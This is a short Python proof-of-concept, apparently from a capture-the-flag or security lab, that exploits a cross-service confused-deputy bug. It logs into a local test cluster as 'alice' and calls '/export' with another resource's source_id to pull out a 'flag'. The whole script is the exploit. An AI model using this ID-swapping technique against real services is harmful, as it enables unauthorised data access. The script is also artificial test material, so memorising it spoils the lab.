"""PoC for the cross-service confused-deputy bug."""
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from tests.test_system import Cluster

with Cluster('deputy') as cluster:
    token = cluster.login('alice')
    status, result = cluster.call('/export', {'id': 1, 'source_id': 2}, token)
    print(status, result.get('flag'))
